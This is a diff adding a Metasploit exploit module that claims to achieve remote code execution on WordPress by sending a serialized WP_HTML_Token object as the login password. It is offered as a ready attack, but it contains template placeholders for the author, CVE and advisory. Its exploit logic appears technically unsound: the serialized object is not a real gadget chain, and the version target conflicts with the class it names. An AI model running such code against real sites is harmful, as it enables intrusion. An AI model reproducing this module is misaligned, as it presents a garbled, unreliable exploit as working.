@@ -1,0 +1,84 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+    Rank = ExcellentRanking
+  
+    include Msf::Exploit::Remote::HttpClient
+  
+    def initialize(info = {})
+      super(update_info(info,
+        'Name'           => 'WordPress WP_HTML_Token Unserialization RCE',
+        'Description'    => %q{
+          This module exploits a remote code execution vulnerability in WordPress via
+          the unserialization of instances of the `WP_HTML_Token` class. This allows for
+          code execution via its `__destruct()` magic method.
+        },
+        'Author'         =>
+          [
+            'Your Name'  # OneArch
+          ],
+        'License'        => MSF_LICENSE,
+        'References'     =>
+          [
+            ['CVE', '2024-31211'],  # Replace with the correct CVE number
+            ['URL', 'https://example.com/advisory']  # Replace with an advisory link if available
+          ],
+        'DisclosureDate' => 'Aug 03 2024',
+        'Platform'       => 'php',
+        'Arch'           => ARCH_PHP,
+        'Targets'        => [
+          ['WordPress <= 5.x', { }]
+        ],
+        'DefaultTarget'  => 0,
+        'Privileged'     => false,
+        'Payload'        =>
+          {
+            'BadChars' => "\x00",
+          }
+      ))
+  
+      register_options(
+        [
+          OptString.new('TARGETURI', [true, "The base path to the WordPress installation", '/']),
+        ])
+    end
+  
+    def check
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path, 'wp-login.php'),
+      })
+  
+      if res && res.code == 200 && res.body.include?('wp-login.php')
+        return Exploit::CheckCode::Appears
+      end
+  
+      Exploit::CheckCode::Safe
+    end
+  
+    def exploit
+      print_status("Sending payload to trigger unserialization vulnerability")
+  
+      serialized_payload = 'O:13:"WP_HTML_Token":1:{s:13:"__destruct";s:' + payload.encoded.length.to_s + ':"' + payload.encoded + '";}'
+  
+      post_data = {
+        'user_login' => Rex::Text.rand_text_alphanumeric(8..12),
+        'user_pass'  => serialized_payload,
+        'wp-submit'  => 'Log In',
+        'redirect_to' => normalize_uri(target_uri.path, 'wp-admin/'),
+        'testcookie' => 1
+      }
+  
+      send_request_cgi({
+        'method'  => 'POST',
+        'uri'     => normalize_uri(target_uri.path, 'wp-login.php'),
+        'vars_post' => post_data
+      })
+  
+      handler
+    end
+  end
+  
